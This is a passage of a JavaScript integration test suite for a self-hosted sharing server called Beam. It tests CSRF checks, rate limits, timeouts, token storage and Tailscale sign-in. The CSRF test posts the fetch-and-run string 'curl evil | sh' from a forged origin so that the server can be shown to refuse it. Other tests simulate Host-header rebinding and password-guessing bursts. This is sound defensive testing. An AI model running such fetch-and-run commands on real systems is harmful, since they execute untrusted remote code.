  const s = await startServer('link', 8791, { env: { BEAM_TRUSTED_PROXIES: '172.17.0.0/16', BEAM_TAILSCALE: '', BEAM_TAILSCALE_SOCKET: ts.socket } });
  try {
    const K = s.key;
    // a second hop through a trusted Docker proxy: the address before it is the client
    const phoneApp = await openEvents(s.port, app(K, 'phoneapp001', 'Pixel', 'android', from('100.64.20.20, 172.17.0.1')));
    await phoneApp.wait('hello');
    await sleep(300);
    let r = await s.req('GET', '/api/me', { headers: { ...cookie(K, 'phonebrow01', { 'X-Beam-Platform': 'web' }), ...from('fd7a:115c:a1e0::20') } });
    assert.equal(r.json.you, 'phoneapp001', 'browser on the IPv6 address of the same machine is linked');
    // reinstall rule: GUI apps only, and a linked browser tab doesn't block it
    const tab = await openEvents(s.port, { ...cookie(K, 'phonebrow01', { 'X-Beam-Platform': 'web' }), ...from('fd7a:115c:a1e0::20') }, '/api/events?platform=web');
    await tab.wait('hello');
    phoneApp.close();
    await sleep(300);
    await s.req('GET', '/api/me', { headers: app(K, 'phoneapp002', 'Pixel', 'android', from('100.64.20.20')) });
    r = await s.req('GET', '/api/devices', { headers: app(K, 'phoneapp002', 'Pixel', 'android', from('100.64.20.20')) });
    assert.deepEqual(r.json.devices.filter(d => d.name === 'Pixel').map(d => d.id), ['phoneapp002'], 'old app merged despite the open tab');
    await s.req('GET', '/api/me', { headers: app(K, 'cli00000001', 'cli', 'cli', from('100.64.20.20')) });
    await s.req('GET', '/api/me', { headers: app(K, 'cli00000002', 'cli', 'cli', from('100.64.20.20')) });
    r = await s.req('GET', '/api/devices', { headers: app(K, 'phoneapp002') });
    assert.equal(r.json.devices.filter(d => d.platform === 'cli').length, 2, 'CLI devices are never merged by the reinstall rule');
    // two Windows accounts on one PC (different X-Beam-Profile) stay two devices; the same account reinstalled merges
    const pc = extra => app(K, extra.id, 'PC', 'windows', { ...from('100.64.30.30'), 'X-Beam-Profile': extra.profile });
    await s.req('GET', '/api/me', { headers: pc({ id: 'pcuserA0001', profile: 'aaaaaaaaaaaaaaaa' }) });
    await sleep(20);
    await s.req('GET', '/api/me', { headers: pc({ id: 'pcuserB0001', profile: 'bbbbbbbbbbbbbbbb' }) });
    r = await s.req('GET', '/api/devices', { headers: app(K, 'phoneapp002') });
    assert.deepEqual(r.json.devices.filter(d => d.name === 'PC').map(d => d.id).sort(), ['pcuserA0001', 'pcuserB0001'], 'another Windows account is not a reinstall');
    await sleep(20);
    await s.req('GET', '/api/me', { headers: pc({ id: 'pcuserA0002', profile: 'aaaaaaaaaaaaaaaa' }) });
    r = await s.req('GET', '/api/devices', { headers: app(K, 'phoneapp002') });
    assert.deepEqual(r.json.devices.filter(d => d.name === 'PC').map(d => d.id).sort(), ['pcuserA0002', 'pcuserB0001'], 'the same account reinstalled is merged');
    // a loopback request that claims another Host is not "this computer"
    await s.req('GET', '/api/me', { headers: app(K, 'hostapp0001', 'Host', 'windows') });
    r = await s.req('GET', '/api/me', { headers: { ...cookie(K, 'rebind00001', { 'X-Beam-Platform': 'web' }), Host: 'evil.example:8791' } });
    assert.equal(r.json.you, 'rebind00001');
    tab.close();
  } finally { await s.stop(); await ts.close(); }
});

// ---------------------------------------------------------------- A8 CSRF

test('A8: cookie-authenticated changes need same-origin proof; JSON endpoints need JSON', async () => {
  const s = await startServer('csrf', 8791);
  try {
    const K = s.key;
    const pw = await post(s, '/api/password', { password: 'long enough pw' }, app(K, 'csrfapp0001'));
    assert.equal(pw.status, 200);
    const login = await post(s, '/api/login', { secret: 'long enough pw' }, { ...sameOrigin, Cookie: 'beam_device_id=csrfbrow001' });
    const token = cookieValue(login);
    const evil = { Origin: 'https://evil.tail9876.ts.net', 'Sec-Fetch-Site': 'same-site' };
    const lr = (await post(s, '/api/login-requests', { name: 'Attacker' }, from('100.64.66.66'))).json;
    let r = await s.req('POST', '/api/login-requests/approve', { headers: { ...cookie(token, 'csrfbrow001'), ...evil, 'Content-Type': 'text/plain' }, body: JSON.stringify({ code: lr.code }) });
    assert.equal(r.status, 403);
    r = await s.req('POST', '/api/password', { headers: { ...cookie(token, 'csrfbrow001'), ...evil, 'Content-Type': 'text/plain' }, body: '{"password":"attacker-pass"}' });
    assert.equal(r.status, 403);
    r = await s.req('POST', '/api/text', { headers: { ...cookie(token, 'csrfbrow001'), ...evil, 'Content-Type': 'text/plain' }, body: 'curl evil | sh' });
    assert.equal(r.status, 403);
    // Beam's own page: Sec-Fetch-Site, or a matching Origin, or the X-Beam-Device-Id header
    r = await s.req('POST', '/api/text', { headers: { ...cookie(token, 'csrfbrow001'), ...sameOrigin, 'Content-Type': 'text/plain' }, body: 'hi' });
    assert.equal(r.status, 415, 'cookie requests must send JSON');
    r = await post(s, '/api/text', { text: 'hi' }, { ...cookie(token, 'csrfbrow001'), Origin: `http://127.0.0.1:${s.port}` });
    assert.equal(r.status, 201);
    r = await post(s, '/api/text', { text: 'hi' }, { ...cookie(token, 'csrfbrow001'), 'X-Beam-Device-Id': 'csrfbrow001' });
    assert.equal(r.status, 201);
    r = await s.req('POST', '/api/logout', { headers: { ...cookie(token, 'csrfbrow001'), ...evil } });
    assert.equal(r.status, 403);
    r = await s.req('POST', '/api/autopair', { headers: { ...evil } });
    assert.equal(r.status, 403);
    r = await post(s, '/api/login', { secret: 'long enough pw' }, { ...evil });
    assert.equal(r.status, 403);
    // bearer requests are not affected
    r = await s.req('POST', '/api/text', { headers: { ...app(K, 'csrfapp0001'), ...evil, 'Content-Type': 'text/plain' }, body: 'from curl' });
    assert.equal(r.status, 201);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A9 password limits

// Sends the headers now and the body when finish() is called.
function delayedPost(port, route, body, headers) {
  const data = Buffer.from(JSON.stringify(body));
  let r;
  const done = new Promise(resolve => {
    r = http.request({ host: '127.0.0.1', port, method: 'POST', path: route, agent: false, headers: { ...headers, 'Content-Type': 'application/json', 'Content-Length': data.length } }, res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
    r.on('error', () => resolve('error'));
    r.flushHeaders();
  });
  return { done, finish: () => r.end(data) };
}

test('A9: password guesses are limited even in parallel; bad keys are limited too', async () => {
  const s = await startServer('pw', 8791);
  try {
    const K = s.key;
    await post(s, '/api/password', { password: 'correct horse battery' }, app(K, 'pwapp000001'));
    const burst = Array.from({ length: 15 }, (_, i) => delayedPost(s.port, '/api/login', { secret: `guess-${i}` }, { ...from('100.64.5.5'), ...sameOrigin }));
    await sleep(300);
    const t0 = Date.now();
    const hello = (async () => { await sleep(50); const t = Date.now(); await s.req('GET', '/api/hello'); return Date.now() - t; })();
    burst.forEach(b => b.finish());
    const statuses = await Promise.all(burst.map(b => b.done));
    assert.equal(statuses.filter(x => x === 403).length, 5, `statuses: ${statuses}`);
    assert.equal(statuses.filter(x => x === 429).length, 10);
    assert.ok((await hello) < 1500, 'the server stays responsive');
    assert.ok(Date.now() - t0 < 10000);
    let r = await post(s, '/api/login', { secret: 'correct horse battery' }, { ...from('100.64.5.5'), ...sameOrigin });
    assert.equal(r.status, 429, 'the address stays locked, even for the right password');
    // 30 attempts overall in 10 minutes
    let last;
    for (let i = 0; i < 31; i++) last = await post(s, '/api/login', { secret: `x${i}` }, { ...from(`100.64.6.${i}`), ...sameOrigin });
    assert.equal(last.status, 429);
    // bad bearer keys: 30 per address, then 429 for that address only
    for (let i = 0; i < 30; i++) await s.req('GET', '/api/me', { headers: { Authorization: `Bearer nope${i}`, ...from('100.64.7.7') } });
    r = await s.req('GET', '/api/me', { headers: { Authorization: `Bearer ${K}`, ...from('100.64.7.7') } });
    assert.equal(r.status, 429);
    r = await s.req('GET', '/api/me', { headers: { Authorization: `Bearer ${K}`, ...from('100.64.7.8') } });
    assert.equal(r.status, 200);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A10 timeouts & connection caps

test('A10: slow unauthenticated bodies are cut off; too many from one address are refused', async () => {
  const s = await startServer('slow', 8791);
  try {
    const sockets = [];
    const closedAfter = new Promise(resolve => {
      const sock = require('node:net').connect(s.port, '127.0.0.1');
      const t = Date.now();
      sock.on('close', () => resolve(Date.now() - t));
      sock.on('error', () => {});
      sock.write('POST /api/login HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: 1000\r\n\r\n{"secret":"');
      sockets.push(sock);
    });
    const ms = await Promise.race([closedAfter, sleep(8000).then(() => Infinity)]);
    assert.ok(ms < 8000, 'a stalled body is dropped (after 30 s normally)');
    const held = Array.from({ length: 25 }, () => delayedPost(s.port, '/api/login-requests', { name: 'x' }, from('100.64.8.8')));
    await sleep(500);
    const quick = await post(s, '/api/login-requests', { name: 'y' }, from('100.64.8.8'));
    assert.equal(quick.status, 429);
    held.forEach(h => h.finish());
    await Promise.all(held.map(h => h.done));
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A11 login requests

test('A11: pending sign-in requests are capped; a device that signs in otherwise withdraws its own', async () => {
  const s = await startServer('lr', 8791);
  try {
    const K = s.key;
    const watcher = await openEvents(s.port, app(K, 'watcher0001', 'Watcher'));
    const mk = (ip, extra = {}) => post(s, '/api/login-requests', { name: 'New', ...extra }, from(ip));
    const a = await mk('100.64.3.1');
    await mk('100.64.3.1');
    await mk('100.64.3.1');
    assert.equal((await mk('100.64.3.1')).status, 429, '3 pending per address');
    await s.req('DELETE', `/api/login-requests/${a.json.id}`, { headers: { 'X-Beam-Login-Secret': a.json.secret } });
    assert.equal((await mk('100.64.3.1')).status, 201, 'settled requests do not count');
    for (let i = 0; i < 9; i++) for (let j = 0; j < 3; j++) await mk(`100.64.4.${i}`);
    assert.equal((await mk('100.64.5.1')).status, 429, '30 pending overall');
    const own = await mk('100.64.5.2', { deviceId: 'newdevice01' });
    assert.equal(own.status, 429);
    const s2 = await startServer('lr2', 8792);
    try {
      const r = await post(s2, '/api/login-requests', { name: 'Mine', deviceId: 'newdevice01' }, from('100.64.5.2'));
      const ev = await openEvents(s2.port, app(s2.key, 'watcher0002'));
      const listed = await s2.req('GET', '/api/login-requests', { headers: app(s2.key, 'watcher0002') });
      assert.equal(listed.json.requests[0].deviceId, 'newdevice01');
      await post(s2, '/api/password', { password: 'another password' }, app(s2.key, 'watcher0002'));
      const pw = await post(s2, '/api/login', { secret: 'another password', client: 'app', deviceId: 'newdevice01' }, from('100.64.5.2'));
      assert.equal(pw.status, 200);
      const poll = await s2.req('GET', `/api/login-requests/${r.json.id}`, { headers: { 'X-Beam-Login-Secret': r.json.secret } });
      assert.equal(poll.json.status, 'withdrawn');
      await ev.wait('login-request-done', d => d.id === r.json.id && d.status === 'withdrawn');
      ev.close();
    } finally { await s2.stop(); }
    watcher.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A12/A13 streams & big texts

test('A12: a stream that stops reading is dropped once 1 MB is queued', async () => {
  const s = await startServer('stall', 8791);
  try {
    const K = s.key;
    const ev = await openEvents(s.port, app(K, 'stalled0001', 'Stalled', 'android'));
    await ev.wait('hello');
    ev.res.pause();
    const h = app(K, 'sender00001');
    for (let i = 0; i < 90; i++) await sendText(s, h, 'x'.repeat(16000) + i);
    await waitFor(() => /Dropped a stalled event stream/.test(s.out), 10000);
  } finally { await s.stop(); }
});

test('A13: long texts live in data/texts, lists carry a 16 KB preview; old inline texts are moved out', async () => {
  let s = await startServer('texts', 8791);
  const h = app(s.key, 'textdev0001');
  try {
    const text = 'é'.repeat(100_000);
    const item = await sendText(s, h, text);
    assert.equal(item.truncated, true);
    assert.equal(item.textLength, 100_000);
    assert.equal(item.text.length, 16 * 1024);
    assert.ok(fs.existsSync(path.join(s.data, 'texts', `${item.id}.txt`)));
    assert.equal((await s.req('GET', `/api/items/${item.id}/text`, { headers: h })).body, text);
    assert.equal((await s.req('GET', `/api/items/${item.id}`, { headers: h })).json.text, text);
    const list = await s.req('GET', '/api/items', { headers: h });
    assert.equal(list.json.items[0].text.length, 16 * 1024);
    await sleep(200);
    assert.ok(fs.statSync(path.join(s.data, 'items.json')).size < 40_000);
  } finally { await s.stop(); }
  const file = path.join(s.data, 'items.json');
  const items = JSON.parse(fs.readFileSync(file, 'utf8'));
  items.push({ id: 'aaaaaaaaaaaaaaaa', kind: 'text', text: 'y'.repeat(200_000), from: null, device: 'Old', to: [], delivered: {}, ts: Date.now() - 1000 });
  fs.writeFileSync(file, JSON.stringify(items));
  s = await startServer('texts', 8791, { keep: true });
  try {
    assert.equal((await s.req('GET', '/api/items/aaaaaaaaaaaaaaaa/text', { headers: h })).body.length, 200_000);
    assert.ok(fs.existsSync(path.join(s.data, 'texts', 'aaaaaaaaaaaaaaaa.txt')));
    assert.match(s.out, /Moved 1 long text/);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A14/A15 storage & retention

test('A14: BEAM_MAX_STORAGE_GB evicts delivered items, else answers 507', async () => {
  const s = await startServer('quota', 8791, { env: { BEAM_MAX_STORAGE_GB: String(2.5 / 1024) } }); // 2.5 MB
  try {
    const K = s.key;
    const a = app(K, 'quotaaaa001', 'A');
    const b = app(K, 'quotabbb001', 'B', 'android');
    await s.req('GET', '/api/me', { headers: b });
    const first = await upload(s, a, 'one.bin', crypto.randomBytes(1_500_000), { to: ['quotabbb001'] });
    let r = await post(s, '/api/uploads', { name: 'two.bin', size: 1_500_000 }, a);
    assert.equal(r.status, 507, 'nothing delivered yet, so nothing can go');
    assert.match(r.json.error, /storage limit/);
    await s.req('POST', `/api/items/${first.id}/ack`, { headers: b });
    r = await post(s, '/api/uploads', { name: 'two.bin', size: 1_500_000 }, a);
    assert.equal(r.status, 201, 'the delivered item made room');
    assert.equal((await s.req('GET', `/api/items/${first.id}`, { headers: a })).status, 404);
  } finally { await s.stop(); }
});

test('A15: retention keeps pinned items and gives undelivered ones longer; max items prefers delivered', async () => {
  const dir = path.join(TMP, 'retention', 'data');
  fs.rmSync(path.join(TMP, 'retention'), { recursive: true, force: true });
  fs.mkdirSync(dir, { recursive: true });
  const day = 86400e3;
  const mk = (id, ageDays, extra = {}) => ({ id, kind: 'text', text: id, from: 'aaaaaaaa01', device: 'A', to: ['bbbbbbbb01'], delivered: {}, ts: Date.now() - ageDays * day, ...extra });
  fs.writeFileSync(path.join(dir, 'devices.json'), JSON.stringify({ aaaaaaaa01: { id: 'aaaaaaaa01', name: 'A', platform: 'windows', firstSeen: 1, lastSeen: Date.now() }, bbbbbbbb01: { id: 'bbbbbbbb01', name: 'B', platform: 'android', firstSeen: 1, lastSeen: Date.now() } }));
  fs.writeFileSync(path.join(dir, 'items.json'), JSON.stringify([
    mk('0000000000000001', 100, { pinned: true }),
    mk('0000000000000002', 20, { delivered: { bbbbbbbb01: 1 } }),
    mk('0000000000000003', 20),
    mk('0000000000000004', 50),
    mk('0000000000000005', 1),
    mk('0000000000000006', 2, { delivered: { bbbbbbbb01: 1 } }),
  ]));
  const s = await startServer('retention', 8791, { keep: true });
  try {
    const h = app(s.key, 'aaaaaaaa01', 'A');
    let ids = (await s.req('GET', '/api/items', { headers: h })).json.items.map(i => i.id).sort();
    assert.deepEqual(ids, ['0000000000000001', '0000000000000003', '0000000000000005', '0000000000000006']);
    const r = await s.req('PATCH', '/api/settings', { headers: json(h), body: JSON.stringify({ maxItems: 3 }) });
    assert.equal(r.status, 200);
    await sleep(300);
    ids = (await s.req('GET', '/api/items', { headers: h })).json.items.map(i => i.id).sort();
    assert.deepEqual(ids, ['0000000000000001', '0000000000000003', '0000000000000005'], 'the delivered item went first');
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- A16/A17/A18/A19 startup, banner, logs, info

test('A16: BEAM_REQUIRE_DATA refuses an empty data folder; a lost key is reported loudly', async () => {
  const s = await startServer('require', 8791, { env: { BEAM_REQUIRE_DATA: '1' }, expectExit: true });
  assert.equal(await s.exited, 78);
  assert.match(s.out, /BEAM_REQUIRE_DATA=1/);
  const t = await startServer('lostkey', 8791);
  await t.stop();
  fs.rmSync(path.join(t.data, 'key'));
  fs.writeFileSync(path.join(t.data, 'items.json'), '[]');
  const u = await startServer('lostkey', 8791, { keep: true });
  await u.stop();
  assert.match(u.out, /Created a NEW Beam key .* already holds Beam data/);
});

test('A17/A18/A19: banner hides the key, pair command, logs, hello and info', async () => {
  const s = await startServer('ops', 8791);
  try {
    const K = s.key;
    assert.ok(!s.out.includes(K), 'the key is never printed');
    await waitFor(() => /server\.js" pair/.test(s.out)); // the banner follows the "is running" line
    const pair = await runNode(['pair'], serverEnv(8791, s.dir));
    assert.equal(pair.code, 0, pair.out);
    const link = /(http:\/\/\S+\/\?key=(bp_[\w-]+))/.exec(pair.out);
    assert.ok(link, pair.out);
    let r = await s.req('GET', `/?key=${link[2]}`);
    assert.equal(r.status, 302);
    assert.ok(cookieValue(r).startsWith('bt_'));
    r = await s.req('GET', `/?key=${link[2]}`);
    assert.equal(r.status, 200, 'a pairing link works once');
    const hello = (await s.req('GET', '/api/hello')).json;
    assert.equal(hello.api, 3);
    assert.ok(Array.isArray(hello.urls));
    const info = (await s.req('GET', '/api/info', { headers: app(K, 'opsdev00001') })).json;
    for (const f of ['tokens', 'move', 'export', 'read-markers', 'thumbnails']) assert.ok(info.features.includes(f));
    assert.ok(info.storage && info.uptime >= 0 && info.settings);
    const logs = (await s.req('GET', '/api/logs?lines=50', { headers: app(K, 'opsdev00001') })).json.lines;
    assert.ok(logs.some(l => /Signed in/.test(l)));
    const file = fs.readFileSync(path.join(s.data, 'logs', 'server.log'), 'utf8');
    assert.ok(!file.includes(K) && !file.includes(cookieValue(await s.req('GET', `/?key=${K}`))), 'no secrets in the log');
  } finally { await s.stop(); }
});

test('A20: --supervise restarts a crashed server and `stop` ends it cleanly', async () => {
  const s = await startServer('supervise', 8791, { args: ['--supervise'] });
  try {
    const pid1 = Number(fs.readFileSync(path.join(s.data, 'server.pid'), 'utf8'));
    process.kill(pid1);
    await waitFor(async () => {
      try { const pid = Number(fs.readFileSync(path.join(s.data, 'server.pid'), 'utf8')); return pid !== pid1 && (await s.req('GET', '/api/hello')).status === 200; } catch { return false; }
    }, 10000);
    assert.match(fs.readFileSync(path.join(s.data, 'logs', 'supervisor.log'), 'utf8'), /restarting in/);
    const stop = await runNode(['stop'], serverEnv(8791, s.dir));
    assert.equal(stop.code, 0, stop.out);
    assert.equal(await Promise.race([s.exited, sleep(8000).then(() => 'still running')]), 0);
  } finally { await s.stop(); }
});

test('A22: app builds: sidecars are read without side effects; a recreated dist/ is still watched', async () => {
  const s = await startServer('dist', 8791);
  try {
    const K = s.key;
    const ev = await openEvents(s.port, app(K, 'distdev0001', 'D', 'android'));
    fs.writeFileSync(path.join(s.dist, 'beam.apk'), 'PK');
    fs.writeFileSync(path.join(s.dist, 'beam.apk.json'), '{"version": "1.');
    await sleep(3500);
    assert.ok(fs.existsSync(path.join(s.dist, 'beam.apk.json')), 'half-written sidecar left alone');
    fs.rmSync(s.dist, { recursive: true, force: true });
    await sleep(500);
    fs.mkdirSync(s.dist, { recursive: true });
    fs.writeFileSync(path.join(s.dist, 'beam.apk'), 'PK2');
    fs.writeFileSync(path.join(s.dist, 'beam.apk.json'), '{"version":"9.9","versionCode":99}');
    const e = await ev.wait('app-update', d => d.android?.versionCode === 99, 10000);
    assert.equal(e.data.android.size, 3);
    ev.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- B1 settings

test('B1: settings: read, validated changes, env locks, learned public address', async () => {
  const s = await startServer('settings', 8791, { env: { BEAM_MAX_ITEMS: '400' } });
  try {
    const K = s.key;
    const h = app(K, 'setdev00001');
    const ev = await openEvents(s.port, h);
    let r = await s.req('GET', '/api/settings', { headers: h });
    assert.equal(r.json.maxItems, 400);
    assert.deepEqual(r.json.locked, ['maxItems']);
    r = await s.req('PATCH', '/api/settings', { headers: json(h), body: JSON.stringify({ retentionDays: 30 }) });
    assert.equal(r.json.retentionDays, 30);
    await ev.wait('settings', d => d.retentionDays === 30);
    assert.equal((await s.req('PATCH', '/api/settings', { headers: json(h), body: JSON.stringify({ retentionDays: -1 }) })).status, 400);
    assert.equal((await s.req('PATCH', '/api/settings', { headers: json(h), body: JSON.stringify({ maxItems: 10 }) })).status, 409);
    assert.equal((await s.req('PATCH', '/api/settings', { headers: json(h), body: JSON.stringify({ movedTo: 'https://x' }) })).status, 400);
    assert.equal((await s.req('PATCH', '/api/settings', { headers: json(h), body: JSON.stringify({ nope: 1 }) })).status, 400);
    await s.req('GET', '/api/me', { headers: { ...h, ...viaServe('100.64.9.1') } });
    r = await s.req('GET', '/api/settings', { headers: h });
    assert.equal(r.json.publicUrl, 'https://beam.tail1234.ts.net');
    assert.equal(r.json.publicUrlLearned, true);
    assert.ok((await s.req('GET', '/api/hello')).json.urls.includes('https://beam.tail1234.ts.net'));
    ev.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- B2 Tailscale sign-in

test('B2: Tailscale identity sign-in: first owner, learned owners, checks and refusals', async () => {
  const ts = await fakeTailscale({ whois: {
    '100.64.30.30': { login: 'alice@example.com', node: 'alice-laptop' },
    '100.64.30.31': { login: 'alice@example.com', node: 'alice-phone' },
    '100.64.30.40': { login: 'mallory@example.com', node: 'mallory' },
    '100.64.30.50': { login: 'bob@example.com', node: 'bob' },
    '100.64.30.60': { login: 'jürgen@example.com', node: 'j' },
  } });
  const s = await startServer('tsid', 8791, { env: { BEAM_TAILSCALE: '', BEAM_TAILSCALE_SOCKET: ts.socket } });
  try {
    // a brand-new Beam: the first Tailscale account to sign in becomes the owner
    let r = await post(s, '/api/autopair', { client: 'app', name: 'Alice laptop', platform: 'windows' }, viaServe('100.64.30.30', 'alice@example.com'));
    assert.equal(r.status, 200, r.body);
    assert.equal(r.json.via, 'tailscale');
    const aliceKey = r.json.key;
    assert.ok(aliceKey.startsWith('bt_'));
    assert.equal((await s.req('GET', '/api/me', { headers: app(aliceKey, r.json.you) })).status, 200);
    // another of Alice's devices, a browser this time
    r = await s.req('POST', '/api/autopair', { headers: { ...viaServe('100.64.30.31', 'alice@example.com'), ...sameOrigin, Cookie: 'beam_device_id=alicephone1' } });
    assert.equal(r.status, 200);
    assert.ok(cookieValue(r).startsWith('bt_'));
    // someone else's account
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('100.64.30.40', 'mallory@example.com'));
    assert.equal(r.json.reason, 'not-owner');
    // headers that tailscaled would never send are rejected
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('100.64.30.40', 'alice@example.com'));
    assert.equal(r.json.reason, 'whois-mismatch');
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('100.64.30.30', 'alice@example.com', { 'Tailscale-Funnel-Request': '?1' }));
    assert.equal(r.status, 403, 'never through Funnel');
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('192.168.1.5', 'alice@example.com'));
    assert.equal(r.status, 403, 'only from Tailscale addresses');
    // Bob becomes an owner when he uses the key through tailscale serve; removing his devices forgets him again
    const owners = async () => (await s.req('GET', '/api/settings', { headers: app(aliceKey, 'x') })).json.tailscaleOwners;
    const K = s.key;
    await s.req('GET', '/api/me', { headers: { ...app(K, 'bobdevice01', 'Bob'), ...viaServe('100.64.30.50', 'bob@example.com') } });
    await waitFor(async () => (await owners()).includes('bob@example.com'));
    r = await post(s, '/api/autopair', { client: 'app', name: 'Bob phone' }, viaServe('100.64.30.50', 'bob@example.com'));
    assert.equal(r.status, 200);
    const bobPhone = r.json.you;
    assert.equal((await s.req('DELETE', '/api/devices/bobdevice01', { headers: app(aliceKey, 'x') })).status, 204);
    assert.ok((await owners()).includes('bob@example.com'), 'still vouched for by the device autopair created');
    assert.equal((await s.req('DELETE', `/api/devices/${bobPhone}`, { headers: app(aliceKey, 'x') })).status, 204);
    assert.ok(!(await owners()).includes('bob@example.com'), 'forgotten with his last device');
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('100.64.30.50', 'bob@example.com'));
    assert.equal(r.json.reason, 'blocked', 'his machine was blocked when its device was removed');
    // RFC 2047 names
    await s.req('PATCH', '/api/settings', { headers: json(app(aliceKey, 'x')), body: JSON.stringify({ tailscaleOwners: ['alice@example.com', 'jürgen@example.com'] }) });
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('100.64.30.60', '=?utf-8?q?j=C3=BCrgen@example.com?='));
    assert.equal(r.status, 200, r.body);
    // turned off
    await s.req('PATCH', '/api/settings', { headers: json(app(aliceKey, 'x')), body: JSON.stringify({ tailscaleSignIn: false }) });
    r = await post(s, '/api/autopair', { client: 'app' }, viaServe('100.64.30.30', 'alice@example.com'));
    assert.equal(r.json.reason, 'disabled');
  } finally { await s.stop(); await ts.close(); }
});

test('B2: a removed device can’t sign straight back in with Tailscale; unblock, and sign-out-others', async () => {
  const ts = await fakeTailscale({ whois: {
    '100.64.40.1': { login: 'alice@example.com', node: 'alice-desk' },
    '100.64.40.2': { login: 'alice@example.com', node: 'alice-phone' },
    '100.64.40.3': { login: 'alice@example.com', node: 'alice-tablet' },
  } });
  const s = await startServer('tsblock', 8791, { env: { BEAM_TAILSCALE: '', BEAM_TAILSCALE_SOCKET: ts.socket } });
  try {
    const pair = ip => post(s, '/api/autopair', { client: 'app', name: ip }, viaServe(ip, 'alice@example.com'));
    const desk = (await pair('100.64.40.1')).json;
    const phone = (await pair('100.64.40.2')).json;
    const tablet = (await pair('100.64.40.3')).json;
    const asDesk = { ...app(desk.key, desk.you), ...viaServe('100.64.40.1', 'alice@example.com') };
    await post(s, '/api/password', { password: 'long password' }, asDesk);
    assert.equal((await s.req('DELETE', `/api/devices/${phone.you}`, { headers: asDesk })).status, 204);
    let r = await pair('100.64.40.2');
    assert.equal(r.status, 403);
    assert.equal(r.json.reason, 'blocked');
    r = await post(s, '/api/login', { secret: 'long password', client: 'app' }, from('100.64.40.2'));
    assert.equal(r.status, 200, 'the password still works for a removed device');
    let settings = (await s.req('GET', '/api/settings', { headers: asDesk })).json;
    assert.equal(settings.blockedNodes.length, 1);
    assert.equal(settings.blockedNodes[0].name, 'alice-phone');
    r = await s.req('PATCH', '/api/settings', { headers: json(asDesk), body: JSON.stringify({ unblockNode: settings.blockedNodes[0].node }) });
    assert.equal(r.json.blockedNodes.length, 0);
    assert.equal((await pair('100.64.40.2')).status, 200, 'unblocked');
    // "my phone was stolen": everyone else out, their machines blocked, Tailscale sign-in off
    r = await post(s, '/api/security/sign-out-others', { disableTailscaleSignIn: true }, asDesk);
    assert.equal(r.status, 200);
    assert.equal(r.json.tailscaleSignIn, false);
    settings = (await s.req('GET', '/api/settings', { headers: { ...app(r.json.key, desk.you), ...viaServe('100.64.40.1', 'alice@example.com') } })).json;
    assert.deepEqual(settings.blockedNodes.map(b => b.name).sort(), ['alice-phone', 'alice-tablet'], 'the caller’s own machine is never blocked');
    assert.equal((await s.req('GET', '/api/me', { headers: app(tablet.key, tablet.you) })).status, 401);
  } finally { await s.stop(); await ts.close(); }
});

// ---------------------------------------------------------------- B3 tokens

test('B3: device tokens: every sign-in path, migration from the master key, revocation, proofs', async () => {
  const s = await startServer('tokens', 8791);
  try {
    const K = s.key;
    const admin = app(K, 'adminapp001', 'Admin');
    let r = await s.req('GET', '/api/me', { headers: admin });
    const migration = r.headers['x-beam-token'];
    assert.ok(migration?.startsWith('bt_'));
    r = await s.req('GET', '/api/me', { headers: admin });
    assert.equal(r.headers['x-beam-token'], migration, 'the same token every time');
    assert.equal((await s.req('GET', '/api/me', { headers: app(migration, 'whatever01') })).json.you, 'adminapp001', 'a token speaks for its own device');
    r = await s.req('GET', '/api/me', { headers: cookie(K, 'oldbrowser1', { 'X-Beam-Platform': 'web' }) });
    assert.ok(cookieValue(r).startsWith('bt_'), 'browsers with the master key cookie get their own token');
    // password (app) and login request
    await post(s, '/api/password', { password: 'password one' }, admin);
    r = await post(s, '/api/login', { secret: 'password one', client: 'app', deviceId: 'appviapw001' }, from('100.64.1.1'));
    assert.ok(r.json.key.startsWith('bt_') && r.json.key !== K);
    const lr = (await post(s, '/api/login-requests', { name: 'Tablet', platform: 'android', deviceId: 'tablet00001' }, from('100.64.1.2'))).json;
    await post(s, '/api/login-requests/approve', { code: lr.code }, admin);
    r = await s.req('GET', `/api/login-requests/${lr.id}`, { headers: { 'X-Beam-Login-Secret': lr.secret } });
    const tablet = r.json.key;
    assert.ok(tablet.startsWith('bt_'));
    assert.equal((await s.req('GET', `/api/login-requests/${lr.id}`, { headers: { 'X-Beam-Login-Secret': lr.secret } })).status, 404, 'handed out once');
    // pairing token used directly by an app becomes its token
    const pair = (await s.req('GET', '/api/pair', { headers: admin })).json;
    assert.ok(pair.key.startsWith('bp_') && pair.expiresAt > Date.now());
    assert.equal((await s.req('GET', '/api/me', { headers: app(pair.key, 'pairedapp01', 'Paired') })).status, 200);
    assert.equal((await s.req('GET', '/api/me', { headers: app(pair.key, 'pairedapp01', 'Paired') })).status, 200);
    // tokens.json holds hashes only, with reserved user/role
    const store = fs.readFileSync(path.join(s.data, 'tokens.json'), 'utf8');
    assert.ok(!store.includes(tablet) && !store.includes(migration) && !store.includes(K));
    const records = Object.values(JSON.parse(store).tokens);
    assert.ok(records.every(t => t.user === 'owner' && t.role === 'owner'));
    // revoke one device
    const tabletEvents = await openEvents(s.port, app(tablet, 'tablet00001', 'Tablet', 'android'));
    await tabletEvents.wait('hello');
    assert.equal((await s.req('DELETE', '/api/devices/tablet00001', { headers: admin })).status, 204);
    await waitFor(() => tabletEvents.closed);
    assert.equal((await s.req('GET', '/api/me', { headers: app(tablet, 'tablet00001') })).status, 401);
    // proofs for moves and discovery
    const nonce = 'nonce-12345678';
    const h1 = crypto.createHash('sha256').update(K).digest();
    const tid = crypto.createHash('sha256').update(h1).digest('hex').slice(0, 16);
    const hello = (await s.req('GET', `/api/hello?nonce=${nonce}&tid=${tid}`)).json;
